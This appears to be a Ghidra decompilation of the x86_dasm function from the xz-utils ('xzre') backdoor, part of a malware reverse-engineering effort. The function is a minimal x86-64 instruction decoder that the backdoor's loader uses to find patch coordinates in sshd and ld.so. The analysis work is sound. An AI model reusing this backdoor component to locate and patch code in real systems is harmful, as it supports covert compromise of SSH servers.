// /home/kali/xzre-ghidra/xzregh/100020_x86_dasm.c
// Function: x86_dasm @ 0x100020
// Calling convention: unknown
// Prototype: undefined x86_dasm(void)


/*
 * AutoDoc: Implements a minimal x86-64 decoder that walks a buffer while tracking instruction metadata. Every search helper in the loader uses it to reason about sshd and ld.so machine code without linking a full disassembler, giving the backdoor reliable patch coordinates at runtime.
 */
#include "xzre_types.h"


undefined8 x86_dasm(undefined8 *param_1,byte *param_2,byte *param_3)

{
  byte bVar1;
  ushort uVar2;
  byte bVar3;
  int iVar4;
  uint uVar5;
  sbyte sVar6;
  byte bVar7;
  uint uVar8;
  long lVar9;
  undefined8 uVar10;
  byte *pbVar11;
  byte *pbVar12;
  byte bVar13;
  uint uVar14;
  ulong uVar15;
  ulong uVar16;
  byte *pbVar17;
  ulong uVar18;
  undefined8 *puVar19;
  BOOL bVar20;
  BOOL bVar21;
  byte bVar22;
  ulong local_38 [4];
  
  bVar22 = 0;
  iVar4 = secret_data_append_from_address(0,0x12,0x46,2);
  if (iVar4 == 0) {
    return 0;
  }
  puVar19 = param_1;
  for (lVar9 = 0x16; lVar9 != 0; lVar9 = lVar9 + -1) {
    *(undefined4 *)puVar19 = 0;
    puVar19 = (undefined8 *)((long)puVar19 + (ulong)bVar22 * -8 + 4);
  }
  bVar20 = param_2 < param_3;
  pbVar11 = param_2;
  do {
    if (!bVar20) {
LAB_00100aa5:
      for (lVar9 = 0x16; lVar9 != 0; lVar9 = lVar9 + -1) {
        *(undefined4 *)param_1 = 0;
        param_1 = (undefined8 *)((long)param_1 + (ulong)bVar22 * -8 + 4);
      }
      return 0;
    }
    bVar13 = *pbVar11;
    if (bVar13 < 0x68) {
      if (bVar13 < 0x2e) {
        if (bVar13 == 0xf) {
          *(undefined4 *)(param_1 + 5) = 0xf;
          pbVar11 = pbVar11 + 1;
LAB_001001c9:
          if (param_3 <= pbVar11) goto LAB_00100aa5;
          iVar4 = *(int *)(param_1 + 5);
          *(int *)(param_1 + 5) = iVar4 << 8;
          bVar13 = *pbVar11;
          uVar5 = (uint)bVar13 | iVar4 << 8;
          *(uint *)(param_1 + 5) = uVar5;
          bVar3 = *pbVar11;
          if ((bVar3 & 0xfd) == 0x38) {
            if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
              return 0;
            }
            pbVar11 = pbVar11 + 1;
            goto LAB_001003fa;
          }
          if (((int)(uint)(byte)(&DAT_0010ad40)[bVar3 >> 3] >> (bVar3 & 7) & 1U) == 0) {
            return 0;
          }
          if ((*(char *)((long)param_1 + 0x14) == -0xd) && (bVar3 == 0x1e)) {
            if (pbVar11 + 1 < param_3) {
              puVar19 = param_1 + 2;
              for (lVar9 = 0x12; lVar9 != 0; lVar9 = lVar9 + -1) {
                *(undefined4 *)puVar19 = 0;
                puVar19 = (undefined8 *)((long)puVar19 + (ulong)bVar22 * -8 + 4);
              }
              *param_1 = param_2;
              param_1[1] = 4;
              iVar4 = (pbVar11[1] == 0xfa) + 0xa5fc + (uint)(pbVar11[1] == 0xfa);
LAB_001004f1:
              *(int *)(param_1 + 5) = iVar4;
              return 1;
            }
            goto LAB_00100aa5;
          }
          *(char *)(param_1 + 10) = (char)((long)pbVar11 - (long)param_2);
          uVar14 = uVar5;
          if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
            uVar14 = (uint)bVar13;
          }
          if ((uVar14 & 0xf0) == 0x80) {
            uVar10 = 4;
LAB_001004a7:
            *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 8;
            param_1[9] = uVar10;
          }
          else {
            if ((byte)uVar14 < 0x74) {
              if (0x6f < (uVar14 & 0xff)) {
LAB_001004a2:
                uVar10 = 1;
                goto LAB_001004a7;
              }
            }
            else {
              uVar8 = (uVar14 & 0xff) - 0xa4;
              if ((uVar8 < 0x23) && ((0x740400101U >> ((byte)uVar8 & 0x3f) & 1) != 0))
              goto LAB_001004a2;
            }
            param_1[9] = 0;
          }
          pbVar12 = pbVar11;
          if (((byte)(&DAT_0010ad20)[uVar14 >> 3 & 0x1f] >> (uVar14 & 7) & 1) == 0) {
            if ((*(byte *)((long)param_1 + 0x11) & 8) != 0) goto LAB_0010067d;
            *param_1 = param_2;
            pbVar11 = (byte *)(((long)pbVar11 - (long)param_2) + 1);
          }
          else {
LAB_001008c5:
            pbVar11 = pbVar12 + 1;
            if (param_3 <= pbVar11) goto LAB_00100aa5;
            bVar13 = *(byte *)(param_1 + 2);
            *(byte *)(param_1 + 2) = bVar13 | 0x40;
            bVar3 = *pbVar11;
            *(byte *)((long)param_1 + 0x1c) = bVar3;
            bVar3 = bVar3 >> 6;
            *(byte *)((long)param_1 + 0x1d) = bVar3;
            bVar7 = *pbVar11;
            *(byte *)((long)param_1 + 0x1e) = (byte)((int)(uint)bVar7 >> 3) & 7;
            bVar1 = *pbVar11;
            *(byte *)((long)param_1 + 0x1f) = bVar1 & 7;
            if (bVar3 == 3) {
LAB_00100902:
              if ((*(uint *)((long)param_1 + 0x1c) & 0xff00ff00) == 0x5000000) {
LAB_0010092e:
                *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 1;
              }
            }
            else {
              if ((bVar1 & 7) == 4) {
                *(byte *)(param_1 + 2) = bVar13 | 0xc0;
              }
              if (bVar3 != 1) {
                if (bVar3 != 2) goto LAB_00100902;
                goto LAB_0010092e;
              }
              *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 3;
            }
            uVar5 = *(uint *)(param_1 + 5);
            if ((uVar5 - 0xf6 < 2) && (((int)(uint)bVar7 >> 3 & 7U) != 0)) {
              *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) & 0xf7;
              param_1[9] = 0;
            }
            if (*(char *)(param_1 + 2) < '\0') {
              if (param_3 <= pbVar12 + 2) goto LAB_00100aa5;
              bVar13 = pbVar12[2];
              *(byte *)((long)param_1 + 0x21) = bVar13;
              *(byte *)((long)param_1 + 0x22) = bVar13 >> 6;
              *(byte *)((long)param_1 + 0x23) = (byte)((int)(uint)pbVar12[2] >> 3) & 7;
              bVar13 = pbVar12[2];
              *(byte *)((long)param_1 + 0x24) = bVar13 & 7;
              if ((bVar13 & 7) == 5) {
                if ((*(byte *)((long)param_1 + 0x1d) & 0xfd) == 0) {
                  *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 1;
                }
                else if (*(byte *)((long)param_1 + 0x1d) == 1) {
                  *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 3;
                }
              }
              bVar13 = *(byte *)((long)param_1 + 0x11);
              if ((bVar13 & 2) == 0) {
                if ((bVar13 & 1) != 0) {
                  pbVar12 = pbVar12 + 3;
                  goto LAB_0010073c;
                }
                if ((bVar13 & 8) != 0) {
                  pbVar11 = pbVar12 + 3;
                  goto LAB_00100680;
                }
                *param_1 = param_2;
                pbVar11 = pbVar12 + 2 + (1 - (long)param_2);
                goto LAB_001004e1;
              }
              pbVar11 = pbVar12 + 3;
LAB_001009ea:
              if (param_3 <= pbVar11) goto LAB_00100aa5;
              bVar13 = *(byte *)((long)param_1 + 0x11);
              param_1[6] = (long)(char)*pbVar11;
            }
            else {
              bVar13 = *(byte *)((long)param_1 + 0x11);
              if ((bVar13 & 2) != 0) {
                pbVar11 = pbVar12 + 2;
                goto LAB_001009ea;
              }
              if ((bVar13 & 1) != 0) goto LAB_0010065f;
            }
            if ((bVar13 & 8) != 0) goto LAB_0010067d;
            *param_1 = param_2;
            pbVar11 = pbVar11 + (1 - (long)param_2);
          }
LAB_001004e1:
          param_1[1] = pbVar11;
          if (pbVar11 == (byte *)0x0) {
            return 0;
          }
          goto LAB_001004ee;
        }
        if (bVar13 != 0x26) goto LAB_00100191;
      }
      else if ((0xc0000000010101U >> ((ulong)(bVar13 - 0x2e) & 0x3f) & 1) == 0) {
        if (bVar13 == 0x67) {
          if ((*(byte *)(param_1 + 2) & 8) != 0) {
            return 0;
          }
          *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 8;
          *(byte *)((long)param_1 + 0x17) = *pbVar11;
        }
        else {
          if (bVar13 != 0x66) {
            if ((bVar13 & 0xf0) == 0x40) {
              *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 0x20;
              bVar13 = *pbVar11;
              pbVar11 = pbVar11 + 1;
              *(byte *)((long)param_1 + 0x1b) = bVar13;
            }
            goto LAB_00100191;
          }
          if (((*(byte *)(param_1 + 2) & 4) != 0) && (*(char *)((long)param_1 + 0x16) != 'f')) {
            return 0;
          }
          if ((*(byte *)(param_1 + 2) & 0x20) == 0) {
            *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 4;
            *(byte *)((long)param_1 + 0x16) = *pbVar11;
          }
        }
        goto LAB_00100675;
      }
      if ((*(byte *)(param_1 + 2) & 2) != 0) {
        return 0;
      }
      *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 2;
      *(byte *)((long)param_1 + 0x15) = *pbVar11;
    }
    else {
      if (bVar13 != 0xf0) {
        if (bVar13 < 0xf1) {
          if (1 < (byte)(bVar13 + 0x3c)) goto LAB_00100191;
          if ((*(byte *)(param_1 + 2) & 0x20) != 0) {
            return 0;
          }
          *(uint *)(param_1 + 5) = (uint)bVar13;
          bVar3 = *pbVar11;
          pbVar12 = pbVar11 + 1;
          *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 0x10;
          *(byte *)(param_1 + 3) = bVar3;
          if (param_3 <= pbVar12) goto LAB_00100aa5;
          bVar7 = pbVar11[1];
          *(undefined1 *)((long)param_1 + 0x1b) = 0x40;
          uVar5 = (uint)bVar13 << 8 | 0xf;
          *(byte *)((long)param_1 + 0x19) = bVar7;
          *(uint *)(param_1 + 5) = uVar5;
          bVar13 = ((char)pbVar11[1] >> 7 & 0xfcU) + 0x44;
          *(byte *)((long)param_1 + 0x1b) = bVar13;
          if (bVar3 == 0xc5) goto LAB_001001c5;
          if (bVar3 != 0xc4) {
            return 0;
          }
          bVar3 = pbVar11[1];
          if ((bVar3 & 0x40) == 0) {
            *(byte *)((long)param_1 + 0x1b) = bVar13 | 2;
          }
          if ((pbVar11[1] & 0x20) == 0) {
            *(byte *)((long)param_1 + 0x1b) = *(byte *)((long)param_1 + 0x1b) | 1;
          }
          if (2 < (byte)((bVar3 & 0x1f) - 1)) {
            return 0;
          }
          if (param_3 <= pbVar11 + 2) goto LAB_00100aa5;
          bVar13 = pbVar11[2];
          bVar7 = bVar7 & 0x1f;
          *(byte *)((long)param_1 + 0x1a) = bVar13;
          if (-1 < (char)bVar13) {
            *(byte *)((long)param_1 + 0x1b) = *(byte *)((long)param_1 + 0x1b) | 8;
          }
          uVar5 = uVar5 << 8;
          *(uint *)(param_1 + 5) = uVar5;
          if (bVar7 == 2) {
            uVar5 = uVar5 | 0x38;
          }
          else {
            if (bVar7 != 3) {
              if (bVar7 != 1) {
                return 0;
              }
              pbVar11 = pbVar11 + 3;
              goto LAB_001001c9;
            }
            uVar5 = uVar5 | 0x3a;
          }
          *(uint *)(param_1 + 5) = uVar5;
          pbVar11 = pbVar11 + 3;
LAB_001003fa:
          if (param_3 <= pbVar11) goto LAB_00100aa5;
          uVar8 = *(int *)(param_1 + 5) << 8;
          *(uint *)(param_1 + 5) = uVar8;
          bVar13 = *pbVar11;
          uVar5 = bVar13 | uVar8;
          *(uint *)(param_1 + 5) = uVar5;
          uVar14 = uVar5;
          if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
            uVar14 = (uint)bVar13 | uVar8 & 0xffffff;
          }
          uVar8 = uVar14 & 0xff00;
          pbVar12 = pbVar11;
          if (uVar8 != 0x3800) {
            uVar5 = uVar14 & 0xff;
            bVar13 = (byte)uVar14;
            if (bVar13 < 0xf1) {
              if (uVar5 < 0xcc) {
                if (uVar5 < 0x3a) {
                  if (0x37 < uVar5) goto LAB_001005bf;
                  bVar20 = uVar5 - 0x20 < 2;
                  bVar21 = uVar5 - 0x20 == 2;
                }
                else {
                  bVar20 = uVar5 - 0x60 < 3;
                  bVar21 = uVar5 - 0x60 == 3;
                }
                if (!bVar20 && !bVar21) goto LAB_001005d6;
              }
              else if ((0x1000080001U >> (bVar13 + 0x34 & 0x3f) & 1) == 0) goto LAB_001005d6;
LAB_001005bf:
              *(char *)(param_1 + 10) = (char)pbVar11 - (char)param_2;
              if (uVar8 == 0x3a00) {
LAB_0010063c:
                *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 8;
                param_1[9] = 1;
                goto LAB_001008c5;
              }
            }
            else {
LAB_001005d6:
              bVar3 = bVar13 & 0xf;
              if (bVar13 >> 4 == 1) {
                if (bVar3 < 10) {
                  bVar20 = (uVar14 & 0xc) == 0;
                  goto LAB_00100604;
                }
                if (bVar3 != 0xd) {
                  return 0;
                }
              }
              else {
                if (bVar13 >> 4 == 4) {
                  bVar20 = (0x1c57UL >> bVar3 & 1) == 0;
                }
                else {
                  if (bVar13 >> 4 != 0) {
                    return 0;
                  }
                  bVar20 = (bVar13 & 0xb) == 3;
                }
LAB_00100604:
                if (bVar20) {
                  return 0;
                }
              }
              *(char *)(param_1 + 10) = (char)pbVar11 - (char)param_2;
              if ((uVar8 == 0x3a00) && (2 < uVar5 - 0x4a)) goto LAB_0010063c;
            }
            param_1[9] = 0;
            goto LAB_001008c5;
          }
          uVar8 = uVar14 >> 3 & 0x1f;
          if (((byte)(&DAT_0010ad00)[uVar8] >> (uVar14 & 7) & 1) == 0) {
            return 0;
          }
          param_1[9] = 0;
          bVar13 = (&DAT_0010ace0)[uVar8];
          *(char *)(param_1 + 10) = (char)((long)pbVar11 - (long)param_2);
          if ((bVar13 >> (uVar14 & 7) & 1) != 0) goto LAB_001008c5;
          if ((*(byte *)((long)param_1 + 0x11) & 8) == 0) {
            *param_1 = param_2;
            pbVar11 = (byte *)(((long)pbVar11 - (long)param_2) + 1);
            goto LAB_001004e1;
          }
LAB_0010067d:
          pbVar11 = pbVar11 + 1;
LAB_00100680:
          if (param_3 <= pbVar11) goto LAB_00100aa5;
          lVar9 = param_1[9];
          bVar13 = *pbVar11;
          if (lVar9 != 1) {
            pbVar12 = pbVar11 + 1;
            if ((param_1[2] & 0xff000000000004) == 0x66000000000004) {
              if (lVar9 == 2) {
                param_1[9] = 4;
              }
              else if (lVar9 == 4) {
                param_1[9] = 2;
              }
            }
            if (param_3 <= pbVar12) goto LAB_00100aa5;
            uVar2 = CONCAT11(*pbVar12,bVar13);
            if (param_1[9] == 2) {
              param_1[8] = (ulong)uVar2;
              param_1[7] = (long)(short)uVar2;
              pbVar11 = pbVar12 + (1 - (long)param_2);
              *param_1 = param_2;
              goto LAB_001007e4;
            }
            if (param_3 <= pbVar11 + 2) goto LAB_00100aa5;
            pbVar17 = pbVar11 + 3;
            if (param_3 <= pbVar17) goto LAB_00100aa5;
            uVar5 = CONCAT13(pbVar11[3],CONCAT12(pbVar11[2],uVar2));
            if (param_1[9] == 4) {
              param_1[8] = (ulong)uVar5;
              lVar9 = (long)(int)uVar5;
            }
            else {
              if (((param_3 <= pbVar11 + 4) || (param_3 <= pbVar11 + 5)) || (param_3 <= pbVar11 + 6)
                 ) goto LAB_00100aa5;
              pbVar17 = pbVar11 + 7;
              if (param_3 <= pbVar17) goto LAB_00100aa5;
              lVar9 = CONCAT17(pbVar11[7],
                               CONCAT16(pbVar11[6],CONCAT15(pbVar11[5],CONCAT14(pbVar11[4],uVar5))))
              ;
              param_1[8] = lVar9;
            }
            param_1[7] = lVar9;
            goto LAB_0010089f;
          }
          param_1[8] = (ulong)bVar13;
          pbVar11 = pbVar11 + (1 - (long)param_2);
          param_1[7] = (long)(char)bVar13;
          *param_1 = param_2;
          param_1[1] = pbVar11;
        }
        else {
          if ((byte)(bVar13 + 0xe) < 2) goto LAB_001000cf;
LAB_00100191:
          if (param_3 <= pbVar11) goto LAB_00100aa5;
          bVar13 = *pbVar11;
          uVar18 = (ulong)bVar13;
          if (bVar13 == 0xf) {
            *(undefined4 *)(param_1 + 5) = 0xf;
            pbVar12 = pbVar11;
LAB_001001c5:
            pbVar11 = pbVar12 + 1;
            goto LAB_001001c9;
          }
          uVar5 = (uint)bVar13;
          uVar14 = bVar13 & 7;
          if (((byte)(&DAT_0010ad80)[bVar13 >> 3] >> uVar14 & 1) != 0) {
            return 0;
          }
          *(uint *)(param_1 + 5) = (uint)bVar13;
          local_38[0] = 0x3030303030303030;
          *(char *)(param_1 + 10) = (char)((long)pbVar11 - (long)param_2);
          local_38[1] = 0xffff0fc000000000;
          local_38[2] = 0xffff03000000000b;
          local_38[3] = 0xc00bff000025c7;
          uVar15 = local_38[bVar13 >> 6] >> (bVar13 & 0x3f);
          uVar16 = (ulong)((uint)uVar15 & 1);
          if ((uVar15 & 1) == 0) {
            param_1[9] = 0;
          }
          else {
            if (bVar13 < 0xf8) {
              if (bVar13 < 0xc2) {
                if (bVar13 < 0x6a) {
                  if (bVar13 < 0x2d) {
                    if (0x20 < (byte)(bVar13 - 5)) goto LAB_00100344;
                    uVar15 = 0x2020202020;
                  }
                  else {
                    uVar15 = 0x1800000000010101;
                    uVar18 = (ulong)(bVar13 - 0x2d);
                  }
                }
                else {
                  uVar15 = 0x7f80010000000001;
                  uVar18 = (ulong)(bVar13 + 0x7f);
                  if (0x3e < (byte)(bVar13 + 0x7f)) goto LAB_00100344;
                }
                if ((uVar15 >> (uVar18 & 0x3f) & 1) != 0) {
                  uVar16 = 4;
                }
              }
              else {
                uVar18 = 1L << (bVar13 + 0x3e & 0x3f);
                if ((uVar18 & 0x2000c800000020) == 0) {
                  if ((uVar18 & 0x101) != 0) {
                    uVar16 = 2;
                  }
                }
                else {
                  uVar16 = 4;
                }
              }
            }
LAB_00100344:
            *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 8;
            param_1[9] = uVar16;
          }
          sVar6 = (sbyte)uVar14;
          pbVar12 = pbVar11;
          if (((int)(uint)(byte)(&DAT_0010ad60)[bVar13 >> 3] >> sVar6 & 1U) != 0) goto LAB_001008c5;
          if (3 < bVar13 - 0xa0) {
            if ((*(byte *)((long)param_1 + 0x11) & 8) != 0) {
              if ((((*(byte *)(param_1 + 2) & 0x20) != 0) &&
                  ((*(byte *)((long)param_1 + 0x1b) & 8) != 0)) && ((bVar13 & 0xf8) == 0xb8)) {
                param_1[9] = 8;
                *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 0x10;
                *(sbyte *)(param_1 + 4) = sVar6;
                *(undefined4 *)(param_1 + 5) = 0xb8;
              }
              goto LAB_0010067d;
            }
            *param_1 = param_2;
            pbVar11 = (byte *)(((long)pbVar11 - (long)param_2) + 1);
            goto LAB_001004e1;
          }
          *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 5;
LAB_0010065f:
          pbVar12 = pbVar11 + 1;
LAB_0010073c:
          if (((param_3 <= pbVar12) || (param_3 <= pbVar12 + 1)) || (param_3 <= pbVar12 + 2))
          goto LAB_00100aa5;
          pbVar17 = pbVar12 + 3;
          if (param_3 <= pbVar17) goto LAB_00100aa5;
          bVar13 = *(byte *)((long)param_1 + 0x11);
          param_1[6] = (long)CONCAT13(pbVar12[3],CONCAT12(pbVar12[2],CONCAT11(pbVar12[1],*pbVar12)))
          ;
          if ((bVar13 & 4) == 0) {
            if ((bVar13 & 8) != 0) {
              pbVar11 = pbVar12 + 4;
              goto LAB_00100680;
            }
LAB_0010089f:
            *param_1 = param_2;
            pbVar11 = pbVar17 + (1 - (long)param_2);
          }
          else {
            if (((param_3 <= pbVar12 + 4) || (param_3 <= pbVar12 + 5)) ||
               ((param_3 <= pbVar12 + 6 || (param_3 <= pbVar12 + 7)))) goto LAB_00100aa5;
            if ((bVar13 & 8) != 0) {
              pbVar11 = pbVar12 + 8;
              goto LAB_00100680;
            }
            *param_1 = param_2;
            pbVar11 = pbVar12 + 7 + (1 - (long)param_2);
          }
LAB_001007e4:
          param_1[1] = pbVar11;
        }
        if (pbVar11 == (byte *)0x0) {
          return 0;
        }
        uVar5 = *(uint *)(param_1 + 5);
LAB_001004ee:
        iVar4 = uVar5 + 0x80;
        goto LAB_001004f1;
      }
LAB_001000cf:
      if ((*(byte *)(param_1 + 2) & 1) != 0) {
        return 0;
      }
      *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 1;
      *(byte *)((long)param_1 + 0x14) = *pbVar11;
    }
LAB_00100675:
    pbVar11 = pbVar11 + 1;
    bVar20 = pbVar11 < param_3;
  } while( TRUE );
}

